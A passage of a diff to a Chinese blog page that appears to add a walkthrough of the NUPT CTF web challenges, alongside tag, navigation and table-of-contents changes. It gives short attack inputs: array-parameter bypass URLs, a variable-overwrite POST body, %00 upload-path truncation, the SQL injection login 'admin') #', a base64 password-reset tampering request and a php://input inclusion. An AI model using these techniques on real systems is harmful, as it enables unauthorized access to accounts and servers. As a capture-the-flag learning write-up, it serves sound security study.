+<p>或者使用数组绕过，payload</p>
+<p><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=123&amp;b[]=234" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a[]=123&amp;b[]=234</a></p>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>页面提供了源代码链接，进入查看代码审计构造data数据</p>
+<p>pass=1&amp;thepassword_123=1</p>
+<p>达到覆盖原变量值的目的，得到flag</p>
+<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>上传图片文件提示需要上传php文件，上传php文件提示需要上传图片文件<br>抓包查看响应包中的内容，做出如下判断：<br>  1.判断上传文件的后缀是否为图片常用后缀<br>  2.判断上传路径中的文件后缀是否为php后缀</p>
+<p>在上传路径中利用%00截断漏洞实现绕过：/uploads/1.php%00，这里%00还需要进行url编码，或者直接进入hex界面修改相应位置为00，发送后返回flag</p>
+<h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>查看源码构造payload：</p>
+<p>账号为：admin’) #<br>密码为任意<br>得到flag</p>
+<h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>检查题目提供的源码<br>先使用数组成功绕过得到flag</p>
+<h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>发现链接中有base64之后的值，转换后发现是用户名，修改为admin做base64<br>post添加以下参数：<br>user=admin&amp;newpass=123&amp;vcode=1234<br>提交返回flag</p>
+<h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>打开页面发现是一串jsfuck，复制到控制台页面返回1bc29b36f623ba82aaf6724fd3b16718.php<br>访问此文件出现：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>抓包发现响应包中的提示：history of bash<br>查了一下资料，需要访问这个文件  .bash_history<br>发现一个命令行，发现flagbak.zip，下载解压后发现flag</p>
+<h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>进入后页面空白，查看源代码发现代码段，通过php伪协议php://input读取数据流<br>payload： view-source:<a href="http://chinalover.sinaapp.com/web23/?file=php://input" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web23/?file=php://input</a><br>data： meizijiu<br>返回flag</p>
+<h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>右键查看源代码，构造payload：view-source:<a href="http://chinalover.sinaapp.com/web24/?name=meizijiu233" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web24/?name=meizijiu233</a><br>返回flag</p>
 
       
     </div>
@@ -605,7 +467,7 @@ mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本�
       
         <div class="post-tags">
           
-            <a href="/tags/mysql/" rel="tag"><i class="fa fa-tag"></i> mysql</a>
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
           
         </div>
       
@@ -618,8 +480,8 @@ mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/03/15/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2018/07/06/sql-labs/" rel="next" title="sqli-labs解题思路">
+                <i class="fa fa-chevron-left"></i> sqli-labs解题思路
               </a>
             
           </div>
@@ -627,10 +489,6 @@ mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本�
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/26/NYCtf/" rel="prev" title="NYCtf">
-                NYCtf <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -782,7 +640,7 @@ mysql有一个称为secure_file_priv的全局系统变量,5.5.53之前的版本�
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-10-解题思路"><span class="nav-text">1-10/解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1-GET-Error-based-Single-quotes-String"><span class="nav-text">Less-1 GET-Error based-Single quotes-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2-GET-Error-based-Intiger-based"><span class="nav-text">Less-2 GET-Error based-Intiger based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3-GET-Error-based-Single-with-twist-String"><span class="nav-text">Less-3 GET-Error based-Single with twist-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4-GET-Error-based-Double-quotes-String"><span class="nav-text">Less-4 GET-Error based-Double quotes-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-5-GET-Double-injection-Single-quotes-String"><span class="nav-text">Less-5 GET-Double injection-Single quotes-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6-GET-Double-injection-Double-quotes-String"><span class="nav-text">Less-6 GET-Double injection-Double quotes-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-7-GET-Dump-into-outfile-String"><span class="nav-text">Less-7 GET-Dump into outfile-String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-8-GET-Blind-Boolian-based-Single-quotes"><span class="nav-text">Less-8 GET-Blind-Boolian based-Single quotes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-9-GET-Blind-Time-based-Single-quotes"><span class="nav-text">Less-9 GET-Blind-Time based-Single quotes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-10-GET-Blind-Time-based-Double-quotes"><span class="nav-text">Less-10 GET-Blind-Time based-Double quotes</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-20-解题思路"><span class="nav-text">11-20/解题思路</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#南邮ctf之旅-无图"><span class="nav-text">南邮ctf之旅(无图)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#签到题"><span class="nav-text">签到题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#md5-collision"><span class="nav-text">md5 collision</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#签到2"><span class="nav-text">签到2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#这题不是WEB"><span class="nav-text">这题不是WEB</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AAencode"><span class="nav-text">AAencode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单身二十年"><span class="nav-text">单身二十年</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-decode"><span class="nav-text">php decode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单身一百年也没用"><span class="nav-text">单身一百年也没用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COOKIE"><span class="nav-text">COOKIE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MYSQL"><span class="nav-text">MYSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GBK-Injection"><span class="nav-text">GBK Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x00"><span class="nav-text">/x00</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-again"><span class="nav-text">bypass again</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖"><span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传绕过"><span class="nav-text">上传绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入1"><span class="nav-text">SQL注入1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pass-check"><span class="nav-text">pass check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码重置"><span class="nav-text">密码重置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#综合题"><span class="nav-text">综合题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-get-contents"><span class="nav-text">file_get_contents</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖-1"><span class="nav-text">变量覆盖</span></a></li></ol></li></ol></div>
             
 
           </div>
